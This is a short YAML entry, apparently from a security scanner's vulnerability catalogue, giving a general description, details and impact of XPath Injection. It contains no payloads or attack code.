  name: XPath Injection
  description: >
    "XPath Injection occurs when an application constructs XPath queries based on user input without proper validation or sanitization. An attacker can manipulate the input to alter the structure of the XPath query, potentially gaining unauthorized access to sensitive data or bypassing authentication mechanisms."
  details: >
    "When user-supplied data is used in XPath queries without proper sanitization, attackers can inject malicious XPath expressions. This allows them to retrieve data they wouldn't normally have access to, bypass login forms, or manipulate XML data. For example, an attacker could input a crafted query to access a different user's information or obtain an entire set of sensitive data from an XML database."
  impact: >
    "Successful XPath Injection attacks can lead to significant security issues, including unauthorized data access, information leakage, bypassing authentication, and possible control over the application. This may allow attackers to manipulate or retrieve sensitive data, such as usernames, passwords, or personal information stored in XML structures."
